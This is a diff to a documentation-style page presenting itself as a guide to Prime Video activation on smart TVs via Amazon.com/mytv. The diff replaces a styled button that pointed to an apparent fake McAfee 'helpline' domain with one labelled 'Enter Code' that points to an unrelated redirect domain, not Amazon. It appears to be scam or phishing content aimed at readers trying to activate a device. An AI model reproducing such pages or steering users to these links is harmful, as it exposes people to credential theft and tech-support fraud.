@@ -8,7 +8,7 @@ How to Use Amazon.com/mytv for Prime Video Activation on Smart TVs
 .. raw:: html
  
    <div style="text-align:center;">
-       <a href="https://mcafeedesk.securebase.click/helpline/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Go with McAfee Page</a>
+       <a href="https://az.redircoms.com" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Enter Code</a>
    </div>
 
 To activate Prime Video on your Smart TV, open the Prime Video app and choose “Sign in,” which will show a 6-digit code. On your phone or computer, go to Amazon.com/mytv
@@ -53,3 +53,4 @@ To activate Prime Video on your Smart TV, open the Prime Video app and choose �
 * Ensure you're using the correct Amazon account.
 
 * If the code doesn't work, generate a new one from the TV and try again.
+
